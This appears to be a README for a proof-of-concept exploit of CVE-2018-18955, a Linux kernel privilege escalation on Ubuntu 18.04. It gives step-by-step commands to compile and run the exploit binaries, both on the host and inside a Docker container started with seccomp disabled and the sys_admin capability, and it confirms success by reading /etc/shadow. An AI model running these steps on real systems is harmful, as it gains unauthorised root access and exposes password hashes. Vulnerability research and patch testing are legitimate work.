# 2018-18955

## Env
- Ubuntu 18.04
- Docker 20.10

> No further kernel modification is needed because all Ubuntu distributions before 18.10 have the vulnerable kernel.
## Local Escalation

Install newuidmap
```shell
apt-get install uidmap
```

Compile exp
```shell
gcc -o subuid_shell subuid_shell.c
gcc -o subshell subshell.c
```
Execute IN THE SAME TERMINAL:
```shell
./subuid_shell
# or ./subshell
cat /etc/shadow
```

![Omnucx.png](https://ooo.0x0.ooo/2024/04/06/Omnucx.png)

## Docker Escalation

Build docker via Dockerfile:
```shell
sudo docker build -t 18955 .
```
Then enter the container as a normal user:
```shell
sudo docker run -it --rm  --name=18955 --security-opt seccomp=unconfined --cap-add sys_admin 18955:latest /bin/bash
```
Execute poc:
```shell
./subuid_shell
```

Escalation finished
![Omn3Mj.png](https://ooo.0x0.ooo/2024/04/06/Omn3Mj.png)